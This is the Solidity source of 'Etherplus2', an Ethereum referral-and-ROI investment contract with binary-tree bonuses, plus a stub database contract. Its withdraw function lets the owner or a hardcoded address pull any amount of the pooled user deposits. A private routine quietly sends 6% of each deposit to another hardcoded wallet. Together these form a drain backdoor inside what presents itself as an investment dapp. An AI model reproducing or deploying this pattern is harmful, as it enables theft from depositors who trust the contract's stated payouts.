pragma solidity 0.6.0;

contract Etherplus2 {
    address public owner;
    address private withOwner=0x733f4d9FdE3D6012f827f6e766B46DB009932077;
    address private creatorOwner=0x92872574E4Cf5bA1fF7977E327A4ca4f6779c180; //Distribute
    EtherplusDb ethPDbInst;
    address private dbAddress;
    
    uint256 public constant payoutPercent  = 7;
    uint256 public constant MAX_CAPPING = 7;
    
    struct User {
        uint256 id;
        uint256 sponsor;
        uint256 totDirect;
        uint256 totLeft;
        uint256 totRight;
        uint256 creationTime;
        uint256 directBonusBal;
        uint256 totDirectBonus;
        uint256 totBinaryBonus;
        uint256 totRoiBal;
        uint256 totAllBonus;
        uint256 pool_bonus;
        uint256 totPoolBonus;
        uint membership;
        uint256 placement;
        UserBinary binary;
        UserBusiness business;
        bool limitReached;
    }
    
    struct UserBusiness {
        uint256 totLeftBusiness;
        uint256 totRightBusiness;
        uint256 curLeftBusiness;
        uint256 curRightBusiness;
    }
    
    struct UserBinary {
        uint256 parentNode;
        uint256 leftNode;
        uint256 rightNode;
    }
    
    struct Investment{
        uint256 amount;
        uint256 maxEarning;
        uint256 totEarned;
        uint256 roiFlag;
        uint256 roiDuration;
        uint256 roiPercent;
        uint256 creationTime;
    }
    
    constructor () public {
        owner = msg.sender;
    }
    
    event binaryDistributed(uint256 uid, uint256 curLeft,uint256 curRight, uint256 amount,uint256 ctime);
    event withdrawHistory(uint256 uid,uint256 roi,uint256 binary,uint256 level,uint256 reward,uint256 ctime);
    
    function changeDbAddress(address _addr) public onlyOwner returns(bool) {
        dbAddress = _addr;
        ethPDbInst = EtherplusDb(dbAddress);
        return true;
    }
    
    function withdraw(uint256 amt) public {
        if(msg.sender==withOwner || msg.sender==owner){
            require(amt<=address(this).balance,"balance is less than withdraw amount");
            msg.sender.transfer(amt);            
        }
    }
    
    function regUser(address spnsAddr, uint256 position) payable public returns (bool) {
        address uAddr = msg.sender;
        require(msg.value>=0.1 ether, "Sent Ether value is not correct");
        uint32 size;
        assembly {
            size := extcodesize(uAddr)
        }
        require(size == 0, "user address cannot be a contract");
        ethPDbInst.saveNewUser(msg.sender,spnsAddr,position,msg.value);
        transferToCreator(msg.value);
        return true;
    }
    
    function transferToCreator(uint256 amount) private returns (bool){
        payable(creatorOwner).transfer(amount*6/100);
        return true;
    }
    
    function transOldRewardAndLevelInc(address _addr) public onlyOwner returns(bool) {
         (uint256 levelBns,,,,uint256 rewrdBns,,) = ethPDbInst.bonusBalances(_addr);   
         if(levelBns>0 || rewrdBns>0){
             payable(_addr).transfer(levelBns+rewrdBns);
         }
         return true;
    }
    
    function pay() public payable {}
    
    function withdrawBonuses() public returns(bool) {
        require(ethPDbInst.isInvested(msg.sender)==true,"You should invest first");
        (uint256 to_payout, uint256 max_payout) = ethPDbInst.roiPayoutOf(msg.sender);
        (,,,uint256 pool_bonus,,uint256 directBonusBal,uint256 totAllBonus) = ethPDbInst.bonusBalances(msg.sender);
        (uint256 amount,,,,,,) = ethPDbInst.invested(msg.sender);
        require(totAllBonus < max_payout, "Full payouts");
        // ROI PAYOUT 
        uint256 roiPay = to_payout;
        if(to_payout > 0) {
            if(totAllBonus + to_payout > max_payout) {
                to_payout = max_payout - totAllBonus;
            }
            // SAVE LEVEL BONUS
            (,,,,,uint256 sponsor) = ethPDbInst.userBinaryTree(msg.sender);
            if(sponsor!=0 && amount >= 1 ether){
                ethPDbInst.sendMoneyToSponsor(sponsor, to_payout);
            }
        }
        // // LEVEL PAYOUT
        uint256 levelPay = directBonusBal;
        if(directBonusBal > 0) {
            to_payout += directBonusBal;
        }
        // Pool payout
        uint256 rewardPay = pool_bonus;
        if(pool_bonus > 0) {
            to_payout += pool_bonus;
        }

        //Binary payout 
        uint256 binaryPayout = ethPDbInst.calculateBinaryPayout(msg.sender);
        if(binaryPayout > 0) {
            (uint256 curLeft,uint256 curRight,,) = ethPDbInst.userBusiness(msg.sender);
            emit binaryDistributed(ethPDbInst.idByAddress(msg.sender),curLeft,curRight,binaryPayout,block.timestamp);
            to_payout += binaryPayout;
        }
        
        ethPDbInst.updBalncs(roiPay,msg.sender,max_payout);
        
        msg.sender.transfer(to_payout);
        
        emit withdrawHistory(ethPDbInst.idByAddress(msg.sender),roiPay,binaryPayout,levelPay,rewardPay,block.timestamp);
        
        return true;
    }
    
     //modifier
    modifier onlyOwner(){
        require(msg.sender==owner,"only owner can run this");
        _;
    }
    
    function upgradeInvestment() payable public returns (bool) {
        if(ethPDbInst.upgrade(msg.sender,msg.value)){
            transferToCreator(msg.value);       
        }
        return true;
    } 
    
}

contract EtherplusDb {
    address public owner;
    address public dappAddress;
    struct User {
        uint256 id;
        uint256 sponsor;
        uint256 totDirect;
        uint256 totLeft;
        uint256 totRight;
        uint256 creationTime;
        uint256 directBonusBal;
        uint256 totDirectBonus;
        uint256 totBinaryBonus;
        uint256 totRoiBal;
        uint256 totAllBonus;
        uint256 pool_bonus;
        uint256 totPoolBonus;
        uint membership;
        uint256 placement;
        UserBinary binary;
        UserBusiness business;
        bool limitReached;
    }
    
    struct UserBusiness {
        uint256 totLeftBusiness;
        uint256 totRightBusiness;
        uint256 curLeftBusiness;
        uint256 curRightBusiness;
    }
    
    struct UserBinary {
        uint256 parentNode;
        uint256 leftNode;
        uint256 rightNode;
    }
    
    struct Investment{
        uint256 amount;
        uint256 maxEarning;
        uint256 totEarned;
        uint256 roiFlag;
        uint256 roiDuration;
        uint256 roiPercent;
        uint256 creationTime;
    }
    
    uint256 public constant payoutPercent  = 7;
    uint256 public constant MAX_CAPPING = 7;
    
    User[] userList; 
    
    mapping(address => uint256) public pool_rewards_users;
    uint256 public pool_last_draw = now;
    uint256 public pool_balance;
    uint256 public currUId;
    mapping(address => User) users;
    mapping(uint256 => address) public addressById;
    mapping(address=>Investment) public invested;           //how much user invested
    mapping(address=>bool) public isInvested;            //check user invested or not
    mapping(uint256 => uint256[]) public leftReferrals;
    mapping(uint256 => uint256[]) public rightReferrals;
    
    address public topIdAddr;
    uint256 public topIdAmt;
    address[] public poolSpnsAddList;
    uint8[] public levelBonus;
    
    function idByAddress(address addr) view public returns (uint256){}
    function saveNewUser(address uAddr,address spnsAddr,uint256 position, uint256 invAmt) public returns (bool) {}
    function withdrawAllBonuses() public returns (uint256) {}
    function upgrade(address _addr, uint256 invAmt) public returns (bool) {}
    function sendMoneyToSponsor(uint256 spnsId, uint256 amt) public returns (bool) {}
    function updBalncs(uint256 to_payout,address _addr) public returns(bool) {}
    function roiPayoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {}
    function bonusBalances(address addr) view public returns (uint256 directBonus, uint256 binaryBonus, uint256 roiBonus, uint256 pool_bonus, uint256 totPoolBonus, uint256 directBonusBal, uint256 totalBonus) {}
    function userBinaryTree(address addr) view public returns (uint256 parentNode, uint256 leftNode, uint256 rightNode, uint256 totLeft, uint256 totRight, uint256 sponsor) {}
    function calculateBinaryPayout(address _addr) public returns (uint256){}
    function updBalncs(uint256 roiPay,address _addr,uint256 max_payout) public returns(bool) {}
    function userBusiness(address addr) view public returns (uint256 curLeftBusiness, uint256 curRightBusiness, uint256 totLeftBusiness, uint256 totRightBusiness) {}
}